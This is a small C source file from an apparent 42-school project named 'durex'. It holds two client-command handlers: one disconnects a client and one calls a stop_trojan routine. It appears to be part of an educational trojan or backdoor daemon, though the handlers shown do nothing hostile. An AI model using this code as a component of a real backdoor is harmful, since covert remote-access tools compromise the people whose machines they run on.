/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   cmd.c                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/18 16:41:09 by mdufaud           #+#    #+#             */
/*   Updated: 2018/05/20 21:13:18 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

int			cmd_exit(t_durex *durex, int co)
{
	remove_client(durex, co);
	return (1);
}

int			cmd_stop(t_durex *durex, int co)
{
	(void)co;
	stop_trojan(durex);
	return (1);
}
